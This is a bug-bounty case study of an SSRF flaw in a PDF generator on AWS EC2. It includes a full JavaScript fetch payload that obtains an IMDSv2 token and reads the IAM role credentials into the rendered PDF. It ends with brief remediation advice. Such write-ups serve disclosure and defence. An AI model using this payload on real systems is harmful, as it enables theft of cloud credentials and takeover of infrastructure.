# Case Study: AWS IMDSv2 SSRF Bypass & Cloud Infrastructure Pivot

- **Target:** Enterprise Web Application on AWS EC2
- **Severity:** Critical (Cloud IAM Credential Theft)
- **Bounty Awarded:** $12,500
- **Vulnerability Category:** Server-Side Request Forgery (SSRF) to AWS Instance Metadata Service (IMDSv2)

---

## 🔍 Vulnerability Details

A PDF generator endpoint (`/api/export-pdf?url=https://example.com`) was vulnerable to SSRF. AWS IMDSv2 was enabled, requiring an `X-aws-ec2-metadata-token` header obtained via a `PUT` request to `http://169.254.169.254/latest/api/token`.

## 🛠️ Step-by-Step Chain Execution

1. Attacker used the PDF generator engine (PhantomJS / Headless Chrome) which supported JavaScript execution.
2. Injected JavaScript payload inside the rendered HTML page to perform local `fetch()` calls:

```html
<script>
  fetch('http://169.254.169.254/latest/api/token', {
    method: 'PUT',
    headers: { 'X-aws-ec2-metadata-token-ttl-seconds': '21600' }
  })
  .then(res => res.text())
  .then(token => {
    return fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/', {
      headers: { 'X-aws-ec2-metadata-token': token }
    });
  })
  .then(res => res.text())
  .then(role => {
    document.write(role);
  });
</script>
```

3. The generated PDF rendered the IAM Role credentials (`AccessKeyId`, `SecretAccessKey`, `Token`), allowing full AWS Cloud infrastructure takeover.

---

## 🛡️ Remediation Pattern

- Block outbound requests to link-local IP addresses (`169.254.169.254`, `127.0.0.1`) at the network firewall / Security Group level.
- Enforce IMDSv2 with `http_put_response_hop_limit = 1` to prevent multi-hop SSRF exploitation.
